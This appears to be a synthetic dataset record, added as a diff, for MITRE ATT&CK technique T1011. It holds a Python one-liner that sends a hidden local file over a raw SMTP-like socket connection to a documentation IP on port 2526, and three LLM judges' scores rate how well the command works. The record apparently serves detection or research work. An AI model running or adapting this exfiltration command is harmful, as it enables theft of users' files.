@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"203.0.113.77\", 2526)); w=lambda x:s.sendall(x); w(b\"HELO x\\r\\nMAIL FROM:<u@lab>\\r\\nRCPT TO:<r@lab>\\r\\nDATA\\r\\n\"); w(open(\"/Users/Shared/.z\",\"rb\").read()+b\"\\r\\n.\\r\\nQUIT\\r\\n\"); s.close()'",
+  "explanation": "Performs minimal SMTP-like exfiltration over a non-standard submission port, using email as an alternate medium rather than the primary C2 channel, consistent with T1011. Uses documentation IPv4 space for safe demonstration.",
+  "rationale_steps": [
+    "Open a TCP socket to a high, uncommon port (2526) to avoid standard SMTP ports.",
+    "Issue basic SMTP commands and send file contents as the message body.",
+    "Leverages SMTP/email as an alternate network medium for exfiltration.",
+    "No obfuscation; user-level only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-b0aca746",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced shell quoting and valid Python syntax with proper socket usage and semicolons, yielding a parseable one-liner.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements an automated SMTP-like exfiltration of a local file over TCP consistent with T1011, though it ignores SMTP handshakes/responses and uses a documentation IP and nonstandard port, reducing real-world reliability.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T04:35:58.856880Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for socket programming, string operations, and file handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by using Python to establish a socket connection to a remote server on port 2526, sending SMTP commands to exfiltrate the contents of a hidden file (/Users/Shared/.z) via email protocol.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:36:02.039631Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes, correct syntax for socket operations, lambda definition, file handling, and byte string literals.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by performing SMTP-like exfiltration of a file over a non-standard port using a raw socket, directly aligning with the 'Automated Exfiltration' technique (T1011) and the explanation provided.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:06:26.931215Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
